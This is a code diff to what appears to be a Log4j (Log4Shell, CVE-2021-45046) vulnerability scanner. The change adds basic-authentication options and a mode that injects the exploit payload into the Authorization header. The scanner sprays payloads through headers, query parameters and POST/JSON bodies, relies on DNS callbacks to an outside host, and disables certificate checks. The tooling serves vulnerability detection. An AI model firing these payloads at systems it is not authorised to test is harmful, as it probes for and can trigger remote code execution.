@@ -23,6 +23,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
+from requests.auth import HTTPBasicAuth
 
 # Disable SSL warnings
 try:
@@ -111,15 +112,28 @@ def parse_args(args_input):
                         dest="custom_dns_callback_host",
                         help="Custom DNS Callback Host.",
                         action='store')
+    parser.add_argument("--basic-auth-user",
+                        dest="basic_auth_user",
+                        help="Preemptive basic authentication user.",
+                        action='store')
+    parser.add_argument("--basic-auth-password",
+                        dest="basic_auth_password",
+                        help="Preemptive basic authentication password.",
+                        action='store')
+    parser.add_argument("--authorization-injection",
+                        dest="authorization_injection_type",
+                        help="Authorization injection type: (basic) - [Default: none].",
+                        default="none",
+                        action='store')    
     parser.add_argument("--disable-http-redirects",
                         dest="disable_redirects",
                         help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
-                        action='store_true')
+                        action='store_true')    
     
     return parser.parse_args(args_input)
 
 
-def get_fuzzing_headers(payload, headers_file, exclude_user_agent_fuzzing):
+def get_fuzzing_headers(payload, headers_file, exclude_user_agent_fuzzing, authorization_injection_type):
     fuzzing_headers = {}
     fuzzing_headers.update(default_headers)
     with open(headers_file, "r") as f:
@@ -130,6 +144,8 @@ def get_fuzzing_headers(payload, headers_file, exclude_user_agent_fuzzing):
             fuzzing_headers.update({i: payload})
     if exclude_user_agent_fuzzing:
         fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
+    if authorization_injection_type == 'basic':
+        fuzzing_headers["Authorization"] = 'Basic %s' % base64.b64encode((payload + ':fakepassword').encode('utf-8')).decode()
 
     fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
     return fuzzing_headers
@@ -279,14 +295,19 @@ def scan_url(url, callback_host, proxies, args):
         cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
         payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
 
+    auth = None
+    if args.basic_auth_user:
+        auth = HTTPBasicAuth(args.basic_auth_user, args.basic_auth_password)
+
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
                 requests.request(url=url,
                                  method="GET",
+                                 auth=auth,
                                  params={"v": payload},
-                                 headers=get_fuzzing_headers(payload, args.headers_file, args.exclude_user_agent_fuzzing),
+                                 headers=get_fuzzing_headers(payload, args.headers_file, args.exclude_user_agent_fuzzing, args.authorization_injection_type),
                                  verify=False,
                                  timeout=timeout,
                                  allow_redirects=(not args.disable_redirects),
@@ -299,8 +320,9 @@ def scan_url(url, callback_host, proxies, args):
                 # Post body
                 requests.request(url=url,
                                  method="POST",
+                                 auth=auth,
                                  params={"v": payload},
-                                 headers=get_fuzzing_headers(payload, args.headers_file, args.exclude_user_agent_fuzzing),
+                                 headers=get_fuzzing_headers(payload, args.headers_file, args.exclude_user_agent_fuzzing, args.authorization_injection_type),
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
                                  timeout=timeout,
@@ -313,8 +335,9 @@ def scan_url(url, callback_host, proxies, args):
                 # JSON body
                 requests.request(url=url,
                                  method="POST",
+                                 auth=auth,
                                  params={"v": payload},
-                                 headers=get_fuzzing_headers(payload, args.headers_file, args.exclude_user_agent_fuzzing),
+                                 headers=get_fuzzing_headers(payload, args.headers_file, args.exclude_user_agent_fuzzing, args.authorization_injection_type),
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
                                  timeout=timeout,
@@ -347,6 +370,12 @@ def main(options):
                     continue
                 urls.append(i)
 
+    if args.basic_auth_user:
+        cprint(f"[•] Using preemptive basic authentication with user [{args.basic_auth_user}].")
+        if not args.basic_auth_password:
+            raise ValueError("'--basic-auth-password' is mandatory when basic authentication user is defined.")
+        if args.authorization_injection_type != 'none':
+            raise ValueError("'--authorization-injection' is not compatible when basic authentication is defined.")
     dns_callback_host = ""
     if args.custom_dns_callback_host:
         cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
